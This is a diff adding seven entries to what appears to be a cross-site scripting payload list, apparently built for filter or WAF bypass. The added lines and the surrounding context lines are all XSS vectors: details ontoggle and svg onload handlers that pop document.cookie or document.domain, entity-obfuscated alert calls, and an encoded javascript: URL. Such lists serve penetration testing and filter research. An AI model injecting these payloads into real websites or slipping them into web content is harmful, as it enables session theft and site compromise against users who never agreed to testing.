@@ -10,6 +10,13 @@
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
 <a href=java%26%23x0Dscript%26%230000058alert(document%26%230000046cookie%26%230000041>search
+ONxss=><details open ontoggle=prompt(document.domain)+x
+ONxss=><details open ontoggle=prompt(cookie)+x
+ONxss=><details open ontoggle=prompt(document.cookie)+x
+onxss=><svg/ONLoad=alert(cookie)+x
+test"ONxss=><details open ontoggle=prompt(document.domain)+x
+test"ONxss=><details open ontoggle=prompt(cookie)+x
+test"ONxss=><details open ontoggle=prompt(document.cookie)+x
 "><d3"<"/onclick=">[confirm``]"<">z
 "><img/src/onerror=.1|alert`` class=d>
 ""><div contextmenu=xss><p>BAGASKARA<menu type=context class= id=xss onshow=print(1)></menu></div>
